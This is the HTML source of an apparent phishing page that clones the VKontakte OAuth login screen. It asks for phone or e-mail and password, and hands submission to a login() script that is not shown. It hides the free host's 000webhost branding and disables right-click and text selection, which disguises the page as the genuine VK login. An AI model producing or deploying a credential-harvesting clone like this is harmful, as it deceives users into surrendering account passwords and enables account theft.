<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
 <head>
  <meta content="text/html; charset=utf-8" http-equiv="content-type"/>
  <title>
   ВКонтакте | Вход
  </title>
  <link href="http://vk.com/images/faviconnew.ico?3" rel="shortcut icon"/>
  <link href="/auth/css/fonts_cnt1.css" rel="stylesheet" type="text/css">
   <link href="/auth/css/common1.css" rel="stylesheet" type="text/css"/>
   <link href="/auth/css/oauth_popup1.css" rel="stylesheet" type="text/css"/>
   <script language="javascript" src="/auth/css/common_light.js" type="text/javascript">
   </script>
   <style>
    img[alt="www.000webhost.com"]{display:none;}
   </style>
   <body class="VK oauth_centered" onresize="onBodyResize(true);">
    <script>
     if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
    </script>
    <script type="text/javascript">
     document.ondragstart = noselect;
		document.onselectstart = noselect;
		document.oncontextmenu = noselect;
		function noselect(){return false;}
    </script>
    <div class="oauth_wrap">
     <div class="oauth_wrap_inner">
      <div class="oauth_wrap_content" id="oauth_wrap_content">
       <div class="oauth_head">
        <a class="oauth_logo fl_l" href="https://vk.com" target="_blank">
        </a>
        <div class="oauth_head_info fl_r" id="oauth_head_info">
         <a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">
          Регистрация
         </a>
        </div>
       </div>
       <div class="oauth_content box_body clear_fix">
        <div class="box_msg_gray box_msg_padded">
         Для продолжения Вам необходимо войти
         <b>
          ВКонтакте
         </b>
         .
        </div>
        <form action="#" method="post" novalidate="">
         <div class="oauth_form">
          <center>
          </center>
          <div class="oauth_form_login">
           <div class="oauth_form_header">
            Телефон или e-mail
           </div>
           <input class="oauth_form_input dark" maxlength="1024" minlength="2" name="email" required="required" type="text" value=""/>
           <div class="oauth_form_header">
            Пароль
           </div>
           <input class="oauth_form_input dark" maxlength="1024" minlength="2" name="pass" required="required" type="password">
            <button class="flat_button oauth_button button_wide" id="install_allow" onclick="return login(this);" type="submit">
             Войти
            </button>
            <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">
             Забыли пароль?
            </a>
            <input class="unshown" name="submit_input" type="submit"/>
           </input>
          </div>
         </div>
        </form>
       </div>
      </div>
     </div>
    </div>
    <style>
     [class="cbalink"]{display:none;}
    </style>
   </body>
  </link>
